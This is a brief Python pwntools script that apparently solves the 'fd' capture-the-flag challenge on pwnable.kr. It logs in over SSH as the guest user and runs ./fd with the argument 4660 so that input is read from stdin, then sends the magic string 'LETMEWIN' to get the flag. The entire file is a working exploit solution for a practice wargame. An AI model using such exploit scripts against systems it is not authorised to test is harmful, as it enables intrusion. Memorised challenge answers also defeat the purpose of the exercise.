from pwn import *

argv = ['fd','4660']
payload = 'LETMEWIN'

s = ssh('fd','pwnable.kr',2222,'guest')
p = s.process(argv,'./fd')
p.sendline(payload.encode())

print(p.recvall().decode())
